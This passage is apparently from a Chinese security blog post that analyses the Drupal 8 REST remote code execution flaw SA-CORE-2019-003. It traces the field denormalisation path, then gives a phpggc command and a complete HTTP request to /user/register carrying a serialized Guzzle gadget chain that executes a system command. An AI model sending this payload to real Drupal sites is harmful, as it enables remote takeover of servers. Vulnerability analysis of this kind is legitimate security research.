![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5FNzpn0FJEg7iaah5toicgQhVkCokuIsgic6icDibpt52meA82TfcVkJYMibQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5LibhjK2HNjE8k6pMA2ia9kWBl6sskTnY5ibjKU29mULurtvEmlVCYqDmw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5VqR9Fc0ZgIrXOLWdqnJZeJRePHZ8TCovQRnCibwaBtSruPWuYddGFsQ/640?wx_fmt=png "")  
  
FieldNormalizer->denormalize 果然和想象的一致，是可以从 List 中提取出单个元素再次进行 denormalize 处理  
  
核心就在于 $item_class = $items->getItemDefinition()->getClass(); 能获得 FieldItemInterface 的实现吗？  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5I2FQA7jZfHBpuySIbT1Z7FTE6EiazY5YHwibiafwxMPT7eoz7ywz869cg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5MHuJQPiaDfR5xnsRvJft29ZPS6QLupaibbgkm1gfMYc63K7GLaGia2eiaQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5LmO4IzT1bHQGE0ezZbItjibUw2yYGNZbhFrbeTeBuh6yicwRDWJgibGTw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL55WtVx48sIJaszHNkWRQ4SrpeNdNu2octM6HHicFiaibnMqzqRjjLYibKIA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5iaZiasA4v1L7xYSUAoASvfficOao1ibdsILvOMLCbxOumuZpHaxYphp54g/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5990tzPVVibfPtTBaq1b9eS87huR9EMW9OeQQ2SHysWwDRkowyXBmPUA/640?wx_fmt=png "")  
  
对应的 $definitions  
 是 DiscoveryCachedTrait  
 中保存的 $definitions  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5x5AxEHBmBzGuk2U4VuicypaXsGEicDCcE669jOeZefnWh2kOgeCnrANQ/640?wx_fmt=png "")  
  
而在这之中恰好存在  
- field_item:link  
  
- DrupallinkPluginFieldFieldTypeLinkItem  
  
- filed_item:map  
  
- DrupalCoreFieldPluginFieldFieldTypeMapItem  
  
那么至此漏洞以及 drupal 的流程也已叙述完毕  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb401J19YFe6w86pnBLLcLESsibJicFK9OzNM7T44OuhYlFo8libskc4fD3zhuBiaquHFzQO3rB0QsOlhg/640?wx_fmt=png "")  
  
  
漏洞证明  
  
如果使用/user/register接口的话，可以跳过正常的字段检测，那么需要一些必要字段来通过check，此次没有阅读源码直接猜想得出常见的用户注册字段。但是又会产生新的错误，不如不操作 : (  
  
之后确认源码，针对输入信息的校验其实是发生在所有的denormalize之后的所以即使不传入相关信息也可以正常触发反序列化  
  
利用 phpggc  
```
phpggc guzzle/rce1 system id --json
```  
  
如果使用/user/register 接口的话那么需要一些必要字段来通过check此次因为是REST接口所以可以，不阅读源码直接猜想得出  
```
POST /drupal/user/register?_format=hal_json HTTP/1.1
Host: 127.0.0.1
Content-Type: application/hal+json
cache-control: no-cache
Postman-Token: 258f5d68-a142-4837-b76c-b15807e84bdb
{
"link": [{"options":"O:24:"GuzzleHttp\Psr7\FnStream":2:{s:33:"u0000GuzzleHttp\Psr7\FnStreamu0000methods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\HandlerStack":3:{s:32:"u0000GuzzleHttp\HandlerStacku0000handler";s:2:"id";s:30:"u0000GuzzleHttp\HandlerStacku0000stack";a:1:{i:0;a:1:{i:0;s:6:"system";}}s:31:"u0000GuzzleHttp\HandlerStacku0000cached";b:0;}i:1;s:7:"resolve";}}s:9:"_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}"}],
"title": ["bbb"],
"username": "213",
"password": "EqLp7rhVvsh3fhPPsJBP",
"email": "c1tas@c1tas.com",
"_links": {
"type": {"href": "http://127.0.0.1/drupal/rest/type/shortcut/default"}
}
}------WebKitFormBoundary7MA4YWxkTrZu0gW--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f4CbNfICAmW37ssiahhr7XHJpQQRt7lL5FYx3Oget28ZajyfFJtLDFmJhSqpZxibjn1XgNXBR4rgXW0Ze33ibht5A/640?wx_fmt=png "")  
## 0x03 参考链接  
  
Drupal core – Highly critical – Remote Code Execution – SA-CORE-2019-003 | Drupal.org  
  
[Drupal SA-CORE-2019-003 远程命令执行分析-腾讯御见威胁情报中心](https://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&mid=2247488600&idx=2&sn=de0b6554acfcf1e250dc5382b3034236&scene=21#wechat_redirect)  
  
  
Exploiting Drupal8’s REST RCE  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png "虚线阴影分割线")  
```
```  
